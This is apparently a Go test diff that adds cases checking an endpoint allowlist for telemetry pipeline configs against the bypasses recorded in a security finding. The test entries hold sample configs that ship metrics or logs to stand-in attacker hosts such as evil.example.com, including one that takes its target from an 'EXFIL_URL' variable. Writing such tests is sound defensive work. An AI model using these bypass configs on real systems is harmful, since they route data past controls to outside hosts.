@@ -133,4 +133,92 @@ otelcol.exporter.otlp "leak" {
 		Expect(CheckEndpoints(`prometheus.remote_write "cap" {`, []string{allowed})).
 			To(MatchError(ContainSubstring("invalid_config")))
 	})
+
+	// Finding H6's own probe set, verbatim. Five of these were ALLOWED by the
+	// allowlist this replaces, and the two marked "control" were already
+	// blocked — they are here so a rewrite that lost them fails too, rather
+	// than looking like a pure improvement.
+	//
+	// Every host below is under example.com/example.net by design: the probe
+	// must never be able to resolve, let alone connect, if a future change
+	// turns this into something that dials.
+	DescribeTable("refuses every shape finding H6 proved bypassed the old allowlist",
+		func(config string, mustName string) {
+			err := CheckEndpoints(config, []string{allowed, "localhost", "127.0.0.1", "::1"})
+			Expect(err).To(MatchError(ErrEndpointNotAllowed), "config:\n%s", config)
+			Expect(err.Error()).To(ContainSubstring(mustName))
+		},
+		Entry("bypass 1: bracketed IPv6 host:port",
+			"prometheus.scrape \"p\" {\n  targets = [{__address__ = \"[2001:db8::1]:9090\"}]\n  forward_to = []\n}",
+			"2001:db8::1"),
+		Entry("bypass 2: a bare host name with no port",
+			"otelcol.receiver.solace \"p\" {\n  broker = \"broker.evil.example.com\"\n  queue = \"q\"\n  output { }\n}",
+			"broker.evil.example.com"),
+		Entry("bypass 3: an endpoint the config COMPUTES rather than names",
+			`prometheus.remote_write "p" { endpoint { url = sys.env("EXFIL_URL") } }`,
+			"sys.env(...)"),
+		Entry("bypass 4: a host buried in a MySQL DSN",
+			`prometheus.exporter.mysql "p" { data_source_name = "u:p@tcp(db.evil.example.com:3306)/x" }`,
+			"db.evil.example.com"),
+		Entry("bypass 5: a scheme that is not http(s)",
+			`prometheus.remote_write "p" { endpoint { url = "ftp://evil.example.com/x" } }`,
+			"evil.example.com"),
+		Entry("control: a plain http URL, blocked before and after",
+			`prometheus.remote_write "p" { endpoint { url = "http://evil.example.com/api/v1/write" } }`,
+			"evil.example.com"),
+		Entry("control: a bare host:port, blocked before and after",
+			`otelcol.exporter.otlp "p" { client { endpoint = "otel.evil.example.com:4317" } }`,
+			"otel.evil.example.com"),
+		Entry("string concatenation, which builds a URL out of parts",
+			`prometheus.remote_write "p" { endpoint { url = "http://" + sys.env("H") + "/write" } }`,
+			"computes value(s)"),
+		Entry("a dotted-quad the allowlist does not name",
+			`otelcol.exporter.otlp "p" { client { endpoint = "203.0.113.7:4317" } }`,
+			"203.0.113.7"),
+	)
+
+	// The other half: a deny-by-default gate that refuses the configs the
+	// transform actually produces is not a gate, it is an outage. These are the
+	// shapes rule K really emits.
+	It("accepts a transformed config carrying component references, relabel regexes and fixture paths", func() {
+		config := `
+discovery.relabel "src" {
+  targets = [{__address__ = "simulator:9111", __scheme__ = "http", job = "synthetic"}]
+}
+
+prometheus.scrape "app" {
+  targets      = discovery.relabel.src.output
+  forward_to   = [prometheus.remote_write.cap.receiver]
+  job_name     = "app"
+  metrics_path = "/metrics"
+}
+
+prometheus.relabel "filter" {
+  forward_to = [prometheus.remote_write.cap.receiver]
+  rule {
+    source_labels = ["__name__"]
+    regex         = "go_.*"
+    action        = "keep"
+    target_label  = "team"
+  }
+}
+
+loki.source.file "logs" {
+  targets    = [{__path__ = "/tmp/shepherd-sim/logs/file-logs.log", job = "file-logs"}]
+  forward_to = []
+}
+
+prometheus.remote_write "cap" {
+  endpoint {
+    url = "http://shepherd-simulator:9110/capture/prometheus/api/v1/write"
+  }
+}
+`
+		Expect(CheckEndpoints(config, []string{allowed, "simulator"})).To(Succeed())
+	})
+
+	It("expands a configured allowlist entry that is itself an address, so host:port entries still allow their host", func() {
+		config := `otelcol.exporter.otlp "cap" { client { endpoint = "simulator:4317" } }`
+		Expect(CheckEndpoints(config, []string{"simulator:4317"})).To(Succeed())
+	})
 })
